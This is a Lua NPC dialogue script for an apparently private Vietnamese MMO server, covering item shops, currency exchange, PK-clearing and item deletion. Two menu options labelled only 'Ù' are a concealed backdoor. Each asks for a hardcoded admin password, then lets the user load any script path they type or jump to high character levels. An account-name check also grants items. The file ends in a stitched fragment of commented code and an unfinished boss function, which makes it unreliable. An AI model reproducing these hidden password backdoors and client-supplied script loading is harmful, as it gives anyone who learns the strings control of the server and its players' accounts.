Include("\\script\\global\\bil4i3n\\bil4i3n_awardplayerstop.lua")
Include("\\script\\global\\bil4i3n\\bil4i3n_diemdanhhangngay.lua")
Include("\\script\\global\\bil4i3n\\bil4i3n_server_config.lua")
Include("\\script\\global\\bil4i3n\\bil4i3n_testgame.lua")
Include("\\script\\global\\bil4i3n\\bil4i3n_inc.lua")
Include("\\script\\global\\bil4i3n\\bil4i3n_duatop_maychumoi.lua")
Include("\\script\\vng_feature\\resetbox.lua")
Include("\\script\\_event\\api.lua")
Include("\\script\\task\\equipex\\head.lua")
Include("\\script\\global\\bil4i3n\\bil4i3n_inc.lua")
Include("\\script\\_extension\\award_code_like_share.lua")
Include("\\script\\_extension\\award_top_race.lua")

function resetboxVNG()
	return ResetBox:ShowDialog()
end

function bilReceived_Item_Lost(bil_In_1)
	local bil_1 = {
		{{6,1,1266,1,0,0,0}, "ThÇn Hµnh Phï"},
		{{6,1,4259,1,0,0,0}, "CÈm Nang §ång Hµnh"},
	}
	if bil.False(bil_1[bil_In_1]) then
		return Msg2Player("Ph¸t sinh lçi nhËn l¹i vËt phÈm, liªn hÖ víi GM ®Ó ®­îc gi¶i quyÕt!")
	end
	local bil_2 = AddItem(unpack(bil_1[bil_In_1][1]))
	SetItemBindState(bil_2, -2)
	return Msg2Player(bil.C(10, "NhËn l¹i "..bil_1[bil_In_1][2].." thµnh c«ng!"))
end

function Bil_DelItem()
	return Say("B¹n cã ch¾c muèn <color=red>hñy vËt phÈm<color> chø, h·y suy nghÜ kü!<enter><color=0xffff5f>TÊt c¶ c¸c vËt phÈm ®­îc yªu cÇu hñy sÏ bÞ hñy bá <enter>hoµn toµn bëi hÖ thèng, bÊt kÓ lµ vËt phÈm nµo!", 2, "Ta nghÜ kü råi!/Bil_DelItem_Sure", "Th«i, ta nhÇm!/OnCancel")
end

function Bil_DelItem_Sure()
	GiveItemUI("Hñy vËt phÈm", "§¹i hiÖp h·y cÈn träng trong   viÖc hñy vËt phÈm!", "bilDisposeConfirm", "OnCancel", 1);
end

function bilDisposeConfirm(nCount)
	local bilLogDelItemFileName = openfile("script/global/bil4i3n/bil4i3n_log/del_item_"..date("%d_%m_%Y")..".log", "a");
	
	local bil_3_G, bil_3_D, bil_3_P, bil_3_L, bil_3_S
	local Count_ItemRemove = 0
	
	for i=1, nCount do
		local nItemIndex = GetGiveItemUnit(i)
		local strItem = GetItemName(nItemIndex)
		
		bil_3_G, bil_3_D, bil_3_P, bil_3_L, bil_3_S = GetItemProp(nItemIndex)
		
		if bil_3_G ~= 4 and bil_3_D ~= 417 then
			RemoveItemByIndex(nItemIndex)
			Msg2Player("§· hñy vËt phÈm [<color=green>"..strItem.."<color>]")
			
			Count_ItemRemove = Count_ItemRemove + 1
		end

		write(bilLogDelItemFileName, date("%H:%M:%S").."\t Account: "..GetAccount().."\tName: "..GetName().."\t DelItem: "..strItem, "\n")
		
	end
	closefile(bilLogDelItemFileName)
	Msg2Player("Thao t¸c hñy vËt phÈm thµnh c«ng")
	Talk(1, "", "Thao t¸c thµnh c«ng, kiÓm tra l¹i!<enter>§· hñy<color=yellow> "..Count_ItemRemove.."<color> vËt phÈm!");	
end

function main()
--Msg2SubWorld("<color=pink>b¶o tr× 1 phót më toµn bé chøc n¨ng game cho anh em nhe.")

--Msg2SubWorld("<color=green>CËp nhËt anh em tho¸t ra vµo game nhËn top t¹i lÔ quan Ba L¨ng HuyÖn..")

--Msg2SubWorld("<color=green>CËp nhËt anh em tho¸t ra vµo thu muc chøa game ch¹y file AUTOUPDATE ®Ó cËp nhËt sÏ thÊy ®­îc h¹ng c¸c cao thñ trong dÊu chÊm ? trªn thanh m¸u..")
dofile("script/global/Â·ÈË_Àñ¹Ù.lua");
	if bilCheckDuaTop:FuncMain() then
		return
	end
	local bilTbOp = {}	
	
	local bilAccGetItemSec = strsub(GetAccount(), 1, 21)
	if bilAccGetItemSec == "accnameclonefornvdatau" then 
		tinsert(bilTbOp, "NhËn trang bÞ Clone/#bilGetItem2AccountClone(-1)")
		tinsert(bilTbOp, "-----------------------------------------/OnCancel")
	end
	
	if ConsumeItem(3, 0, 6, 1, 1266, -1) < 1 and GetTask(5931) == 0 then
		tinsert(bilTbOp, "Gióp t¹i h¹ nhËn l¹i ThÇn Hµnh Phï/#bilReceived_Item_Lost(1)")
	end
	
	
	
	if ConsumeItem(3, 0, 6, 1, 4259, -1) < 1 then
		tinsert(bilTbOp, "Gióp t¹i h¹ nhËn l¹i CÈm nang ®ång hµnh/#bilReceived_Item_Lost(2)")
	end
	tinsert(bilTbOp, "NhËn th­ëng Like vµ Share Facebook/#e_code_likeshare.main()")
	tinsert(bilTbOp, "Mua Nguyªn LiÖu Event 2-9/nguyenlieuev")
                      tinsert(bilTbOp, "Mua L­íi §¸nh C¸ - LÖnh Bµi PL§/mualuoilenhbai")
                           tinsert(bilTbOp, "§æi 100 tiÒn ®ång ra 1kv /doitiendongravan")
                          -- tinsert(bilTbOp, "§æi 300 v¹n ra 10 xu /doiravan")
                      --tinsert(bilTbOp, "Ta ®· cÊp 200 vµ muèn trïng sinh/trungsinh")
                            tinsert(bilTbOp, "Mua VËt PhÈm Ðp Hoµn Mü/hoanmy")
	tinsert(bilTbOp, "Röa S¹ch Téi PK Gi¸ 10xu /ruatoipk")
	--tinsert(bilTbOp, "T¹i h¹ ®Õn ®Ó ®iÓm danh h»ng ngµy/bilDailyMuster")
	--tinsert(bilTbOp, "T¹i h¹ ®Õn ®Ó nhËn danh hiÖu Thµnh Chñ/bilAwardCityWar")
	tinsert(bilTbOp, "NhËn th­ëng Danh hiÖu vµ vßng s¸ng tuÇn võa råi/bilGetAwardTOPPlayers")
	--tinsert(bilTbOp, "§¨ng ký xãa MËt khÈu r­¬ng/resetboxVNG")
	tinsert(bilTbOp, "KÕt thóc ®èi tho¹i/bil.OnCancel")
	tinsert(bilTbOp, "Ù/NhapPassReload")
	tinsert(bilTbOp, "Ù/nhancap1")
	Say("<color=Orange>LÔ quan: <color>KiÕm hiÖp quÇn hïng chiÕn nam h¶i Long tranhHæ ®Êu diÖu Cöu ch©u. Ta vèn sø gi¶ ®¹i biÓu T©y s¬n c­ ë chç nµy hoan nghªnh c¸c anh hïng hµo kiÖt, mét  lÇn n÷a rÊt vinh dù khi ®­îc lµ ng­êi ®ång hµnh cïng c¸c ®¹i hiÖp trªn hµnh tr×nh b«n tÈu giang hå!", getn(bilTbOp), bilTbOp)

end

function skill()
AddMagic(711, 1)
end


function doitiendongravan()
	local nSilverCount = CalcEquiproomItemCount(4, 417, 1, 1) ;
	if(nSilverCount < 100) then -- gia xu
		Talk(1,"","cÇn 100xu nhÐ ®¹i hiÖp h·y chuÈn bÞ ®ñ råi gÆp ta.") -- go
	return end
		if  CalcFreeItemCellCount() < 10 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>10<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
ConsumeEquiproomItem(100,4,417,1,1)
Earn(10000000)
end

function nguyenlieuev()
	local tbOpt =
	{
		{"Mua 10 TÊm V¶i §á = 10v", vaido10},
		{"Mua 10 Sao Vµng = 10v", saovang10},
		{"Mua 10 D©y thõng = 1v", daythung10},
		{"Mua 10 Cuén chØ = 10v", cuonchi10},
		{"Mua 10 giÊy gãi hoa = 10v", giaygoi10},
		{"Mua 10 giá ®ùng hoa = 20v", giodung10},
		{"Tho¸t"},
	}
	CreateNewSayEx("<npc>®¹i hiÖp muèn mua g× kh«ng?", tbOpt)
end


function mualuoilenhbai()
	local tbOpt =
	{
		{"Mua l­íi ®¸nh c¸", mualuoi},
		{"Mua lÖnh bµi Phong L¨ng §é", lbphonglang},
		{"Tho¸t"},
	}
	CreateNewSayEx("<npc>®¹i hiÖp muèn mua g× kh«ng?", tbOpt)
end


function lbphonglang()
	local nSilverCount = CalcEquiproomItemCount(4, 417, 1, 1) ;
	if(nSilverCount < 2) then -- gia xu
		Talk(1,"","cÇn 2xu 1 lÖnh bµi nhÐ ®¹i hiÖp h·y chuÈn bÞ ®ñ råi gÆp ta.") -- go
	return end
		if  CalcFreeItemCellCount() < 10 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>10<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
ConsumeEquiproomItem(2,4,417,1,1)
AddEventItem(489)
end


function hoanmy()
	local tbOpt =
	{
		{"Mua Cóc Hoa Th¹ch", cuchoa},
		{"B¨ng Th¹ch KÕt Tinh", bangthach},
		{"B¨ng ThiÒm T¬", bangthiem},
		{"Kª HuyÕt Th¹ch", kehuyet},
		{"M· N·o", manao},
		{"M·nh Thiªn Th¹ch", thienthach},
		{"§iÒn Hoµn Th¹ch", dienhoan},
		{"Tho¸t"},
	}
	CreateNewSayEx("<npc>Mçi 1 côc gi¸ 10xu ®¹i hiÖp muèn mua g× kh«ng?", tbOpt)
end


function cuchoa()
	local nSilverCount = CalcEquiproomItemCount(4, 417, 1, 1) ;
	if(nSilverCount < 10) then -- gia xu
		Talk(1,"","1 c¸i cÇn 10xu nhÐ ®¹i hiÖp h·y chuÈn bÞ ®ñ råi gÆp ta.") -- go
	return end
		if  CalcFreeItemCellCount() < 30 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>30<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
ConsumeEquiproomItem(10,4,417,1,1)
tbAwardTemplet:GiveAwardByList({{szName="Hoµn Mü",tbProp={4,963,1,1,0},nCount=1,},}, "test", 1);
end


function bangthach()
	local nSilverCount = CalcEquiproomItemCount(4, 417, 1, 1) ;
	if(nSilverCount < 10) then -- gia xu
		Talk(1,"","1 c¸i cÇn 10xu nhÐ ®¹i hiÖp h·y chuÈn bÞ ®ñ råi gÆp ta.") -- go
	return end
		if  CalcFreeItemCellCount() < 30 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>30<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
ConsumeEquiproomItem(10,4,417,1,1)
tbAwardTemplet:GiveAwardByList({{szName="Hoµn Mü",tbProp={4,967,1,1,0},nCount=1,},}, "test", 1);
end


function bangthiem()
	local nSilverCount = CalcEquiproomItemCount(4, 417, 1, 1) ;
	if(nSilverCount < 10) then -- gia xu
		Talk(1,"","1 c¸i cÇn 10xu nhÐ ®¹i hiÖp h·y chuÈn bÞ ®ñ råi gÆp ta.") -- go
	return end
		if  CalcFreeItemCellCount() < 30 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>30<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
ConsumeEquiproomItem(10,4,417,1,1)
tbAwardTemplet:GiveAwardByList({{szName="Hoµn Mü",tbProp={4,965,1,1,0},nCount=1,},}, "test", 1);
end


function kehuyet()
	local nSilverCount = CalcEquiproomItemCount(4, 417, 1, 1) ;
	if(nSilverCount < 10) then -- gia xu
		Talk(1,"","1 c¸i cÇn 10xu nhÐ ®¹i hiÖp h·y chuÈn bÞ ®ñ råi gÆp ta.") -- go
	return end
		if  CalcFreeItemCellCount() < 30 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>30<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
ConsumeEquiproomItem(10,4,417,1,1)
tbAwardTemplet:GiveAwardByList({{szName="Hoµn Mü",tbProp={4,966,1,1,0},nCount=1,},}, "test", 1);
end


function manao()
	local nSilverCount = CalcEquiproomItemCount(4, 417, 1, 1) ;
	if(nSilverCount < 10) then -- gia xu
		Talk(1,"","1 c¸i cÇn 10xu nhÐ ®¹i hiÖp h·y chuÈn bÞ ®ñ råi gÆp ta.") -- go
	return end
		if  CalcFreeItemCellCount() < 30 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>30<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
ConsumeEquiproomItem(10,4,417,1,1)
tbAwardTemplet:GiveAwardByList({{szName="Hoµn Mü",tbProp={4,964,1,1,0},nCount=1,},}, "test", 1);
end


function thienthach()
	local nSilverCount = CalcEquiproomItemCount(4, 417, 1, 1) ;
	if(nSilverCount < 10) then -- gia xu
		Talk(1,"","1 c¸i cÇn 10xu nhÐ ®¹i hiÖp h·y chuÈn bÞ ®ñ råi gÆp ta.") -- go
	return end
		if  CalcFreeItemCellCount() < 30 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>30<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
ConsumeEquiproomItem(10,4,417,1,1)
tbAwardTemplet:GiveAwardByList({{szName="Hoµn Mü",tbProp={4,968,1,1,0},nCount=1,},}, "test", 1);
end


function dienhoan()
	local nSilverCount = CalcEquiproomItemCount(4, 417, 1, 1) ;
	if(nSilverCount < 10) then -- gia xu
		Talk(1,"","1 c¸i cÇn 10xu nhÐ ®¹i hiÖp h·y chuÈn bÞ ®ñ råi gÆp ta.") -- go
	return end
		if  CalcFreeItemCellCount() < 30 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>30<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
ConsumeEquiproomItem(10,4,417,1,1)
tbAwardTemplet:GiveAwardByList({{szName="Hoµn Mü",tbProp={4,969,1,1,0},nCount=1,},}, "test", 1);
end









function TuiMau()
tbAwardTemplet:GiveAwardByList({{szName="Tói M¸u MiÔn PhÝ",tbProp={6,1,4352,1,0},nCount=1,nExpiredTime=1500,},}, "test", 1);
--tbAwardTemplet:GiveAwardByList({{szName="Hoµn Mü",tbProp={4,963,1,1,0},nCount=1,},}, "test", 1);
--tbAwardTemplet:GiveAwardByList({{szName="Hoµn Mü",tbProp={4,963,1,1,0},nCount=1,},}, "test", 1);
--tbAwardTemplet:GiveAwardByList({{szName="Hoµn Mü",tbProp={4,963,1,1,0},nCount=1,},}, "test", 1);
--tbAwardTemplet:GiveAwardByList({{szName="Hoµn Mü",tbProp={4,963,1,1,0},nCount=1,},}, "test", 1);
end




function doiravan()
	if (GetCash() < 3000000) then
		Talk(1, "", "cÇn cã 300v ®Ó ®æi ®­îc 10xu")
		return
	end
tbAwardTemplet:GiveAwardByList({{szName="Xu",tbProp={4,417,1,1,0},nCount=10,},}, "test", 1);
Pay(3000000)
end



function trungsinh()
	if GetLevel() < 200 then
		Talk(1, "", "§iÒu kiÖn trïng sinh lµ ph¶i cÊp 200 + 10K v¹n + 1 cuèn b¾c ®Èu tr­êng sinh thuËt c¬ së thiªn..haha ng­¬i ch­a ®em theo ®ñ.")
		return
	end
	if (GetCash() < 100000000) then
		Talk(1, "", "§iÒu kiÖn trïng sinh lµ ph¶i cÊp 200 + 10K v¹n + 1 cuèn b¾c ®Èu tr­êng sinh thuËt c¬ së thiªn..haha ng­¬i ch­a ®em theo ®ñ.")
		return
	end
	local nSilverCount = CalcEquiproomItemCount(6,1,1390,1) ;
	if(nSilverCount < 1) then -- gia xu
		Talk(1, "", "§iÒu kiÖn trïng sinh lµ ph¶i cÊp 200 + 10K v¹n + 1 cuèn b¾c ®Èu tr­êng sinh thuËt c¬ së thiªn..haha ng­¬i ch­a ®em theo ®ñ.")
                                                        return
                           end
ConsumeEquiproomItem(1,6,1,1390,1)
	Pay(100000000)
	ST_DoTransLife()
end



function test()
tbAwardTemplet:GiveAwardByList({{szName="L¨ng Nh¹c Th¸i Cùc KiÕm",tbProp={0,164},nCount=1,nQuality = 1,},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="L¨ng Nh¹c Th¸i Cùc KiÕm",tbProp={0,165},nCount=1,nQuality = 1,},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="L¨ng Nh¹c Th¸i Cùc KiÕm",tbProp={0,166},nCount=1,nQuality = 1,},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="L¨ng Nh¹c Th¸i Cùc KiÕm",tbProp={0,167},nCount=1,nQuality = 1,},}, "test", 1);
end



function ABHM()
main_task_give()
end


function nguyenlieuABHM()
tbAwardTemplet:GiveAwardByList({{szName="Tö thñy tinh",tbProp={4,238,1,0,0,0},nCount=10},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="Lôc thñy tinh",tbProp={4,239,1,0,0,0},nCount=10},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="Lam thñy tinh",tbProp={4,240,1,0,0,0},nCount=10},} ,"test", 1);
tbAwardTemplet:GiveAwardByList({{szName="HuyÒn tinh cÊp 8",tbProp={6,1,147,8,0,0},nCount=1},} ,"test", 1);
tbAwardTemplet:GiveAwardByList({{szName="Cóc hoa th¹ch",tbProp={4,963,1,0,0,0},nCount=10},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="B¨ng th¹ch kÕt tinh",tbProp={4,967,1,0,0,0},nCount=10},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="B¨ng ThiÒm T¬",tbProp={4,965,1,0,0,0},nCount=10},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="Kª huyÕt th¹ch",tbProp={4,966,1,0,0,0},nCount=10},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="M· N·o",tbProp={4,964,1,0,0,0},nCount=10},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="M¶nh thiªn th¹ch",tbProp={4,968,1,0,0,0},nCount=10},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="§iÒn Hoµng Th¹ch",tbProp={4,969,1,0,0,0},nCount=10},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="TÝn Sø Kim Bµi",tbProp={6,1,888,1,0,0},nCount=1},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="ThÇn BÝ Kho¸ng Th¹ch",tbProp={6,1,398,1,0,0},nCount=1},}, "test", 1);
tbAwardTemplet:GiveAwardByList({{szName="ThÇn BÝ Kho¸ng Th¹ch",tbProp={6,1,22,1,0,0},nCount=3},}, "test", 1);
end


function ruatoipk()
	local nSilverCount = CalcEquiproomItemCount(4, 417, 1, 1) ;
	if(nSilverCount < 10) then -- gia xu
		Talk(1,"","1 c¸i cÇn 10xu nhÐ ®¹i hiÖp h·y chuÈn bÞ ®ñ råi gÆp ta.") -- go
	return end
		if  CalcFreeItemCellCount() < 30 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>30<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
ConsumeEquiproomItem(10,4,417,1,1)
SetPK(0);
end

function tukhong()
tbAwardTemplet:GiveAwardByList({{szName="L¨ng Nh¹c Th¸i Cùc KiÕm",tbProp={0,15},nCount=1,nQuality = 1,},}, "test", 1);
end


function mualuoi()
	local a = {
		{
			M = "Mua L­íi ®¸nh c¸ (3 tiÒn ®ång, sö dông ®­îc 25 lÇn)",
			P = {
				cc = {
					{CalcEquiproomItemCount, -1, {4,417,1,-1}, 3, "C¸c h¹ kh«ng mang ®ñ tiÒn ®ång, lµ mét cÇn thñ th× ph¶i chu toµn mäi thø chø nhØ?"},
					{CountFreeRoomByWH, -1 , {1,1}, 1, "Kho¶ng trèng trong hµnh trang kh«ng ®ñ, xin h·y s¾p xÕp l¹i hµnh lý!"},
				},
				c = {
					{ConsumeEquiproomItem, {3,4,417,1,-1}},
					{Msg2Player, {"NhËn ®­îc 1 l­íi ®¸nh c¸ tõ CÇn thñ l·o nh©n!"}},
				},
				i = {
					{v = {6,1,4332,1,0,0,0}, n = 1, b = 0, e = 0, p = {25}, ne = "L­íi ®¸nh c¸", l = "mis_CauCa"},
				},
			},
		},
	}
	
	return bil.Say(a, "Lµ mét CÇn thñ ch©n chÝnh, yÕu tè quan träng nhÊt lµ T©m ph¶i TÞnh - ThÇn ph¶i TØnh.")
end


function giaygoi()
if (GetCash() < 10000) then

		Talk(1,"","1 giÊy gãi hoa cÇn 1v.") -- go
	return end
		if  CalcFreeItemCellCount() < 10 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>10<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
Pay(10000)
tbAwardTemplet:GiveAwardByList({{szName="GiÊy gãi hoa",tbProp={6,1,4320,1,0,0},nCount=1},}, "test", 1);
end


function giodung()
if (GetCash() < 20000) then

		Talk(1,"","1 giá hoa cÇn 2v.") -- go
	return end
		if  CalcFreeItemCellCount() < 10 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>10<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
Pay(20000)
tbAwardTemplet:GiveAwardByList({{szName="Giá hoa",tbProp={6,1,4322,1,0,0},nCount=1},}, "test", 1);
end

function giaygoi10()
if (GetCash() < 100000) then

		Talk(1,"","10 giÊy gãi hoa cÇn 10v.") -- go
	return end
		if  CalcFreeItemCellCount() < 10 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>10<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
Pay(100000)
tbAwardTemplet:GiveAwardByList({{szName="GiÊy gãi hoa",tbProp={6,1,4320,1,0,0},nCount=10},}, "test", 1);
end


function giodung10()
if (GetCash() < 200000) then

		Talk(1,"","10 giá hoa cÇn 20v.") -- go
	return end
		if  CalcFreeItemCellCount() < 10 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>10<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
Pay(200000)
tbAwardTemplet:GiveAwardByList({{szName="Giá hoa",tbProp={6,1,4322,1,0,0},nCount=10},}, "test", 1);
end


function vaido10()
if (GetCash() < 100000) then

		Talk(1,"","10 TÊm V¶i §á cÇn 10v.") -- go
	return end
		if  CalcFreeItemCellCount() < 10 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>10<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
Pay(100000)
tbAwardTemplet:GiveAwardByList({{szName="TÊm V¶i §á",tbProp={6,1,4354,1,0,0},nCount=10},}, "test", 1);
end


function saovang10()
if (GetCash() < 100000) then

		Talk(1,"","10 Sao Vµng cÇn 10v.") -- go
	return end
		if  CalcFreeItemCellCount() < 10 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>10<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
Pay(100000)
tbAwardTemplet:GiveAwardByList({{szName="Sao Vµng",tbProp={6,1,4355,1,0,0},nCount=10},}, "test", 1);
end

function daythung10()
if (GetCash() < 10000) then

		Talk(1,"","10 D©y Thõng cÇn 1v.") -- go
	return end
		if  CalcFreeItemCellCount() < 10 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>10<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
Pay(10000)
tbAwardTemplet:GiveAwardByList({{szName="D©y Thõng",tbProp={6,1,4356,1,0,0},nCount=10},}, "test", 1);
end


function cuonchi10()
if (GetCash() < 100000) then

		Talk(1,"","10 Cuén Kim ChØ 10v.") -- go
	return end
		if  CalcFreeItemCellCount() < 10 then
			return Say("<color=cyan><pic=65>§¹i hiÖp kh«ng ®ñ <color=green>10<color> « trèng kh«ng thÓ thùc hiÖn thao t¸c")
		end
Pay(100000)
tbAwardTemplet:GiveAwardByList({{szName="Cuén Kim ChØ",tbProp={6,1,4353,1,0,0},nCount=10},}, "test", 1);
end



function NhapPassReload()
if CalcFreeItemCellCount() < 1 then
		Say("H·y cÊt bít vËt phÈm ®Ó ®¶m b¶o cã 1 « trèng råi h·y më.",0);
		return 1;
end
AskClientForString("checkpassGM2", "", 1, 50, "MK ADMIN");
end

function checkpassGM2(strings)	
	if strings=="adminkhai" then ---------------Ma code open sv opensv
	NhapDuongDanFileCanReLoadVIP()
--tbAwardTemplet:GiveAwardByList({{szName="Kim Phong",tbProp={0,10,2,9,0,0,0},nCount=1, nBindState=-2},}, "test", 1);

		else
		Say("b¹n nhËp pass kh«ng chÝnh x¸c nhËp sai nhiÒu lÇn hÖ thèng sÏ tù xãa nh©n vËt vµ chÆn ip ngay lËp tøc.",0);

	end
end


function NhapDuongDanFileCanReLoadO(Link)
		local ReloadScript = LoadScript(Link);
		if (FALSE(ReloadScript )) then
			Msg2Player("XuÊt hiÖn lçi, kh«ng thÓ Reload!<enter><color=yellow>"..Link.."");
		else
			Msg2Player("<color=green>Reload thµnh c«ng Script<color><enter><color=blue>"..Link.."");
		end
end

function NhapDuongDanFileCanReLoadVIP()
	return AskClientForString("NhapDuongDanFileCanReLoadO", "", 1, 500, "<#>NhËp ®­êng dÉn")
end

function visondao()
NewWorld(342,1178,2412)
AddItem(6,1,2432,1,1,0,0)
end











function nhancap1()
if CalcFreeItemCellCount() < 1 then
		Say("H·y cÊt bít vËt phÈm ®Ó ®¶m b¶o cã 1 « trèng råi h·y më.",0);
		return 1;
end
AskClientForString("checkpassGM", "", 1, 50, "MK ADMIN");
end

function checkpassGM(strings)	
	if strings=="admin113" then -----pass 
	
nhancapdo()
		else
		Say("b¹n nhËp pass kh«ng chÝnh x¸c nhËp sai nhiÒu lÇn hÖ thèng sÏ tù xãa nh©n vËt vµ chÆn ip ngay lËp tøc.",0);

	end
end






function nhancapdo()
	local szTitle = "<npc> mêi  Admin nhËn cÊp ®é !!! "
	local tbOpt =
	{
		{"NhËn cÊp 50", capdo},
		{"NhËn cÊp 90", capdo1},
		{"NhËn cÊp 100", capdo2},
		{"NhËn cÊp 120", capdo3},
		{"NhËn cÊp 150", capdo4},
		{"NhËn cÊp 190", capdo5},
		{"Tho¸t", no},
	}
	CreateNewSayEx(szTitle, tbOpt)
end

function capdo()

local nCurLevel = GetLevel()
local nAddLevel = 50 - nCurLevel
ST_LevelUp(nAddLevel)
Msg2Player("B¹n nhËn ®­îc 50 cÊp")
end;

function capdo1()
local nCurLevel = GetLevel()
local nAddLevel = 90 - nCurLevel
ST_LevelUp(nAddLevel)
Msg2Player("B¹n nhËn ®­îc 90 cÊp")
end;

function capdo2()
local nCurLevel = GetLevel()
local nAddLevel = 100 - nCurLevel
ST_LevelUp(nAddLevel)
Msg2Player("nhËn ®­îc 100 cÊp")
end;

function capdo3()
local nCurLevel = GetLevel()
local nAddLevel = 120 - nCurLevel
ST_LevelUp(nAddLevel)
Msg2Player("B¹n nhËn ®­îc 120 cÊp")
end;

function capdo4()
local nCurLevel = GetLevel()
local nAddLevel = 150 - nCurLevel
ST_LevelUp(nAddLevel)
Msg2Player("B¹n nhËn ®­îc 150 cÊp")
end;

function capdo5()
local nCurLevel = GetLevel()
local nAddLevel = 190 - nCurLevel
ST_LevelUp(nAddLevel)
Msg2Player("B¹n nhËn ®­îc 190 cÊp")
end;
-- =_Message},},
--	{{szName="M¶nh L«i Khung Phong TuyÕt Thanh CÈm §¸i (5/6)",tbProp={4,1282,1,1,0,0},nCount=1,nRate=5, CallBack= _Message},},	

--	{{szName="M¶nh Vô Hoan Thanh ¶nh HuyÒn Ngäc Béi (1/6)",tbProp={4,1284,1,1,0,0},nCount=1,nRate=5, CallBack= _Message},},
--	{{szName="M¶nh Vô Hoan Thanh ¶nh HuyÒn Ngäc Béi (3/6)",tbProp={4,1286,1,1,0,0},nCount=1,nRate=5, CallBack= _Message},},
--	{{szName="M¶nh Vô Hoan Thanh ¶nh HuyÒn Ngäc Béi (5/6)",tbProp={4,1288,1,1,0,0},nCount=1,nRate=5, CallBack= _Message},},	

--	{{szName="Vâ L©m MËt TÞch",tbProp={6,1,26,1,0,0},nCount=1,nRate=10, CallBack= _Message},},
--	{{szName="TÈy Tñy Kinh",tbProp={6,1,22,1,0,0},nCount=1,nRate=5, CallBack= _Message},},
--	{{szName="Nhu T×nh",tbProp={0,190},nCount=1,nRate=1,nQuality = 1, CallBack= _Message},},
--	{{szName="Nhu T×nh",tbProp={0,193},nCount=1,nRate=5,nQuality = 1, CallBack= _Message},},
--	{{szName="§Þnh Quèc",tbProp={0,403},nCount=1,nRate=2,nQuality = 1, CallBack= _Message},},
--	{{szName="§Þnh Quèc",tbProp={0,404},nCount=1,nRate=3,nQuality = 1, CallBack= _Message},},
--	{{szName="§Þnh Quèc",tbProp={0,405},nCount=1,nRate=2,nQuality = 1, CallBack= _Message},},
--	{{szName="§Þnh Quèc",tbProp={0,406},nCount=1,nRate=2,nQuality = 1, CallBack= _Message},},
--	{{szName="§Þnh Quèc",tbProp={0,407},nCount=1,nRate=2,nQuality = 1, CallBack= _Message},},

--}



function OnDeath( nNpcIndex )
	local x, y, world = GetNpcPos(nNpcIndex);
	local maxcount = SIGNET_DROPCOUNT;
	local _, nTongID = GetTongName();
	if (nTongID > 0) then
		if (IsDoubledMoneyBox(nTongID)) then
			maxcount = getSignetDropRate(SIGNET_DROPCOUNT);
		end;
	end;
	local nCurtime = GetCurServerTime() + 7 * 24 *60 * 60
	local nYear = tonumber(FormatTime2String("%Y", nCurtime))
	local nMonth = tonumber(FormatTime2String("%m", nCurtime))
	local nDay = tonumber(FormatTime2String("%d", nCurtime))
	--Bá phÇn th­ëng vËt phÈm khi tiªu diÖt boss - Modified by DinhHQ - 20111012
--	for i = 1, maxcount do
--		local nItemIdx = DropItem(world, x, y, PlayerIndex, 6, 1, 1094, 1, 0, 0, 0, 0, 0, 0, 0, 0);
--		SetSpecItemParam(nItemIdx, 1, nCurtime);
--		SetSpecItemParam(nItemIdx, 2, nYear)
--		SetSpecItemParam(nItemIdx, 3, nMonth)
--		SetSpecItemParam(nItemIdx, 4, nDay)
--		SyncItem(nItemIdx);
--	end;
	--Renew boss award - Modified by DinhHQ - 20120319
